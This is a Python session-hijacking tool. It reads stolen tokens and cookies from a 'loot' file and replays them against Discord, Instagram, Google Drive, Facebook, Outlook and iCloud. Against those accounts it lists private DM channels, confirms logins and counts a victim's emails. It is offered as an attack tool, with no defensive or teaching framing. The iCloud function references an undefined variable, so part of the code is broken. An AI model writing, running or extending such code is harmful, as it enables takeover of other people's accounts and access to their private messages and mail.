import requests
import os

LOOT_FILE = "loot/stolen_tokens.txt"

def choose_target():
    print("\n[🎯] Choose a target to replay:")
    print("[1] Discord")
    print("[2] Instagram")
    print("[3] Google Drive")
    print("[4] Facebook")
    print("[5] Microsoft Outlook")
    print("[6] iCloud")
    return input("Your choice: ").strip()

def extract_token(service_name):
    with open(LOOT_FILE, "r") as f:
        for line in f:
            if service_name in line.lower():
                if "CLIPBOARD:" in line:
                    return line.strip().split("CLIPBOARD: ")[1]
                parts = line.strip().split("\t")
                if len(parts) == 3:
                    return parts[2]
    return None

def replay_discord(token):
    print(f"[💬] Replaying Discord session with token: {token[:20]}...")
    headers = {"Authorization": token}
    response = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
    if response.status_code == 200:
        print(f"[✅] Retrieved {len(response.json())} DM channels.")
        for dm in response.json():
            name = dm.get("recipients", [{}])[0].get("username", "Unknown")
            last_msg_id = dm.get("last_message_id")
            print(f"  • DM with {name} (Last Message ID: {last_msg_id})")
    else:
        print("[❌] Token invalid or expired.")

def replay_instagram(sessionid):
    print(f"[📸] Replaying Instagram session...")
    cookies = {"sessionid": sessionid}
    response = requests.get("https://www.instagram.com/accounts/edit/", cookies=cookies)
    if "email" in response.text:
        print("[✅] Session is valid. You're logged in.")
    else:
        print("[❌] Sessionid expired or blocked.")

def replay_gdrive(sid):
    print("[📁] Listing Google Drive files (experimental)...")
    cookies = {"SID": sid}
    headers = {"User-Agent": "Mozilla/5.0"}
    response = requests.get("https://drive.google.com/drive/my-drive", cookies=cookies, headers=headers)
    if "drive_main_page" in response.text:
        print("[✅] Appears logged into GDrive. (Visual confirmation)")
    else:
        print("[❌] Access blocked. Token likely invalid or Google needs SAPISID too.")

def replay_facebook(fb_cookie):
    print("[👥] Accessing Facebook profile...")
    cookies = {"c_user": fb_cookie}
    response = requests.get("https://m.facebook.com/me", cookies=cookies)
    if "logout" in response.text.lower():
        print("[✅] Logged into Facebook mobile view.")
    else:
        print("[❌] Session blocked or expired.")

def replay_outlook(outlook_token):
    print(f"[📧] Accessing Microsoft Outlook...")
    headers = {"Authorization": f"Bearer {outlook_token}"}
    response = requests.get("https://graph.microsoft.com/v1.0/me/messages", headers=headers)
    if response.status_code == 200:
        print(f"[✅] Retrieved {len(response.json().get('value', []))} emails.")
    else:
        print("[❌] Token invalid or expired.")

def replay_icloud(icloud_token):
    print(f"[🍏] Accessing iCloud...")
    headers = {"Authorization": f"Bearer {icloud_token}"}
    cookies = {"MEAuthToken": icloud_cookie}
    response = requests.get("https://www.icloud.com", headers=headers)
    if response.status_code == 200:
        print("[✅] Successfully accessed iCloud.")
    else:
        print("[❌] Token invalid or expired.")

def run():
    choice = choose_target()
    token_map = {
        "1": ("discord.com", replay_discord),
        "2": ("instagram.com", replay_instagram),
        "3": ("google.com", replay_gdrive),
        "4": ("facebook.com", replay_facebook),
        "5": ("outlook.com", replay_outlook),
        "6": ("icloud.com", replay_icloud)
    }
    
    if choice in token_map:
        service_name, replay_function = token_map[choice]
        token = extract_token(service_name)
        if token:
            replay_function(token)
        else:
            print(f"[!] No token found for {service_name}.")
    else:
        print("[!] Invalid choice.")

if __name__ == "__main__":
    run()
